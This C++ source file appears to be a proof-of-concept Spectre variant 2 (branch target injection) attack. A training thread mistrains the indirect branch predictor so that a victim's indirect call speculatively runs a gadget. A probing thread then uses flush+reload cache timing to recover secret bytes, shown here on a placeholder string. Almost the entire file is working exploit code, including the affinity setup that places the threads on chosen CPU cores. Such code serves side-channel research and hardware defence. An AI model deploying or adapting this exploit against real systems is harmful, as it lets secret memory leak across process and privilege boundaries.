#include <stdio.h>
#include <stdlib.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include <cstdint>
#include <string.h>
#include <pthread.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/syscall.h>
#define gettid() syscall(SYS_gettid)
extern "C" {
  void LoadGadget();
  uint64_t IndirectCall(const void *proc,const void *target_memory, const void *probe_start);
  void evict(void *start, int count, int step);
  void Touch(uint8_t *target_memory, uint8_t *probe_start);
  uint64_t memory_access(void *target);
  uint64_t flush_reload(void *target);
  //uint8_t _binary_1_bmp_start[4096*256];
}

const char TheAnswer[] = "Answer to the Ultimate Question of Life, The Universe, and Everything is 42";
const char FakeAnswer[] = "Fake";
constexpr int probe_lines = 256;
uint64_t tat[probe_lines];
uint8_t *probe = nullptr;
uint8_t junk[10 * 1024 * 4096];
uint8_t fake_probe[probe_lines * 4096];
void *gadget_module = nullptr;

char* error;
void do_nothing(uint8_t*, uint8_t*) {}

void* ProbingThread(void* ) {
    
  int mix_i;
  for (int trial = 1; ; ++trial) {
    usleep(100);
    for (int i = 0; i < probe_lines; ++i) {
      mix_i = ((i * 167) + 13) & 255;
      tat[mix_i] = flush_reload(probe + mix_i * 4096);
    }
     int idx_min=1;
     for (int i = 1; i < probe_lines; ++i){
        //printf("%d \t", tat[i]);
         if (tat[i] < tat[idx_min]) idx_min = i;
      }
    //printf("\n");
      if (tat[idx_min] < 100) {
        printf("trial#%d: guess='%c' (=%02x) (score=%d)\n",
               trial,
               static_cast<uint8_t>(idx_min),
               static_cast<uint8_t>(idx_min),
               static_cast<uint32_t>(tat[idx_min]));
        for (int i = 0; i < probe_lines; ++i) {
            if ((i + 1) % 16 == 0)
              printf("% 6llu\n", tat[i]);
            else
              printf("% 6llu", tat[i]);
        }
        //return NULL;
        trial = 0;
    }
  }
}

void* TrainingThread(void * ) {
  void (*target_proc)(uint8_t*, uint8_t*) = Touch;
  void *call_destination = reinterpret_cast<void*>(&target_proc);
  printf("Training %p %x %p %x %p %p %p\n", call_destination, &target_proc, target_proc,*reinterpret_cast<uint8_t*>(Touch), Touch, fake_probe, reinterpret_cast<void*>(IndirectCall));
  for (;;) {
    IndirectCall(call_destination, FakeAnswer, fake_probe);
  }
}

void victim(const void *target) {
  void (*target_proc)(uint8_t*, uint8_t*) = do_nothing;
  void *call_destination = reinterpret_cast<void*>(&target_proc);
  uint64_t t=0;
    printf(" %p %x %p %x %p %p\n", call_destination, &target_proc, target_proc,*reinterpret_cast<uint8_t*>(Touch), Touch, probe);

  for (int i = 0; i < probe_lines; ++i){
      memory_access(probe + i * 4096);
  }
  for (;;) {
    for (int trial = 0; trial < 20000; ++trial) {
      usleep(5);
      char a = * (char*)(target);
      printf("target = %c %u\n", a, static_cast<uint8_t>(a));
      t=IndirectCall(call_destination, target, probe);
    }
  }
}

void victim_and_probe(const void *target) {
  void (*target_proc)(uint8_t*, uint8_t*) = do_nothing;
  void *call_destination = reinterpret_cast<void*>(&target_proc);
  int mix_i;
  uint64_t t=0;

  for (;;) {
    for (int trial = 0; trial < 20000; ++trial) {
      usleep(10);

      for (int i = 0; i < probe_lines; ++i){
        _mm_clflush(&probe[i * 4096]);
      }
        
      t=IndirectCall(call_destination, target, probe);
      printf("indirect call %d\n",t);
        
      for (int i = 0; i < probe_lines; ++i){
        mix_i = ((i * 167) + 13) & 255;
        tat[mix_i] = flush_reload(probe + mix_i * 4096);
      }

      int idx_min = 0;
      for (int i = 0; i < probe_lines; ++i){
        if (tat[i] < tat[idx_min]) idx_min = i;
      }

      if ( tat[idx_min] < 100) {
        printf("trial#%d: guess='%c' (=%02x) (score=%d)\n",
               trial,
               static_cast<uint8_t>(idx_min),
               static_cast<uint8_t>(idx_min),
               static_cast<uint32_t>(tat[idx_min]));
        for (int i = 0; i < probe_lines; ++i) {
            if ((i + 1) % 16 == 0)
              printf("% 6llu\n", tat[i]);
            else
              printf("% 6llu", tat[i]);
        }
        return;
      }
    }
  }
}


struct spectre_mode {
  uint8_t victim : 1;
  uint8_t probe : 1;
  uint8_t train : 1;
};

spectre_mode parse_options(int argc, char *argv[]) {
  spectre_mode modes{};
  for (int i = 1; i < argc; ++i) {
    if (strcmp(argv[i], "--victim") == 0) modes.victim = 1;
    if (strcmp(argv[i], "--probe") == 0) modes.probe = 1;
    if (strcmp(argv[i], "--train") == 0) modes.train = 1;
  }
  return modes;
}

int main(int argc, char *argv[]) {

    
  gadget_module = dlopen("/usr/lib/x86_64-linux-gnu/libmyspectreattack.so.1.0.1",  RTLD_LAZY);
  probe= reinterpret_cast<uint8_t*>(dlsym(gadget_module,"_binary_1_bmp_start"));
  error = dlerror();
  if (error != NULL) {printf( "!!! %s\n", error ); return 1; }

  LoadGadget();
    
  if (argc < 2) {
    printf("USAGE: spectre --victim|--train [--probe]\n\n");
    return 1;
  }

  auto modes = parse_options(argc, argv);
  if (!modes.victim && !modes.train) {
    printf("--victim or --train needs to be specified.\n");
    return 1;
  }
  if (modes.victim && modes.train) {
    printf("--victim and --train cannot be specified on the same process.\n");
    return 1;
  }


  const int affinity_victim = 3;
  const int affinity_probe = 2;
  const int affinity_train = 3; // must be the same as affinity_victim
  const int offset = argc >= 3 ? atoi(argv[argc - 1]) : 0;
  //const int offset=0;
  cpu_set_t victim_set,probe_set,train_set;
  CPU_ZERO(&victim_set); 
  CPU_ZERO(&probe_set); 
  CPU_ZERO(&train_set); 
  CPU_SET(affinity_victim,&victim_set);
  CPU_SET(affinity_probe,&probe_set);
  CPU_SET(affinity_train,&train_set);
    
   bool thread2_flag=0;
  if (modes.victim) {
    if (modes.probe)
      printf("Starting the victim thread with probing on cpu#%d...\n\n", affinity_victim);
    else
      printf("Starting the victim thread on cpu#%d...\n\n", affinity_victim);

    if(sched_setaffinity(gettid(),sizeof(cpu_set_t),&victim_set)==-1){
        printf("Can not set affinity\n");
        return 1;
    }
      
        
    if (modes.probe)
      victim_and_probe(TheAnswer + offset);
    else
      victim(TheAnswer + offset);
  }
  else if (modes.train) {

    pthread_t thread1, thread2;
    printf("Starting the training thread on cpu#%d...\n", affinity_train);
    pthread_create(&thread1, NULL, TrainingThread,NULL);
    if(pthread_setaffinity_np(thread1, sizeof(cpu_set_t),&train_set)==-1){
        printf("Can not set affinity\n");
        return 1;
    }
    
    if (modes.probe) {
        thread2_flag=1;
        printf("Starting the probing thread on cpu#%d...\n", affinity_probe);
        pthread_create(&thread2, NULL, ProbingThread, NULL);
        pthread_setaffinity_np(thread2, sizeof(cpu_set_t),&probe_set);
    }
      
    pthread_join( thread1, NULL);
     printf("thread1 join\n");
    if(thread2_flag) pthread_join( thread2, NULL);
  }
  dlclose(gadget_module);
  return 0;
}
